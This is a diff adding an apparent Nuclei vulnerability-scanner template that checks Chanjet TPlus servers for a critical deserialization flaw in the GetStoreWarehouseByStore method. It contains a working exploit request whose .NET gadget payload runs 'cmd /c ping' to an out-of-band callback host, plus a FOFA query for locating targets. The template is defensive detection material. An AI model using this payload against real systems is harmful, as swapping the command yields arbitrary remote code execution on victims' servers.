@@ -1,0 +1,56 @@
+id: chanjet-tplus-rce
+
+info:
+  name: Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Changjet Tplus has a front-end remote code execution vulnerability. An attacker can use the GetStoreWarehouseByStore method to inject a serialized payload and execute arbitrary commands. This ultimately results in leakage of sensitive server information or code execution.
+  reference:
+    - https://peiqi.wgpsec.org/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20GetStoreWarehouseByStore%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+    - https://github.com/MrWQ/vulnerability-paper/blob/7551f7584bd35039028b1d9473a00201ed18e6b2/bugs/%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="畅捷通-TPlus"
+  tags: chanjettplus,rce,oast
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+        Host: {{Hostname}}
+        X-Ajaxpro-Method: GetStoreWarehouseByStore
+
+        {
+          "storeID":{
+            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName":"Start",
+            "ObjectInstance":{
+            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "StartInfo":{
+              "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "FileName":"cmd",
+              "Arguments":"/c ping {{interactsh-url}}"
+            }
+            }
+          }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "actorId或archivesId不能为空"
+          - "\"Type\":\"System.ArgumentException\""
+          - "Object reference not set to an instance of an object"
+          - "System.NullReferenceException"
+        condition: or
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+# digest: 4a0a00473045022100a53bafe7dde75005e55a9259ee5b6aad04aac009d8be109b138092abf7d6a679022015b544b5d2492ef8e250701b35fc6d1ba30a0e8d0648f96c32d074bfb6c3e1d9:922c64590222798bb761d5b6d8e72950
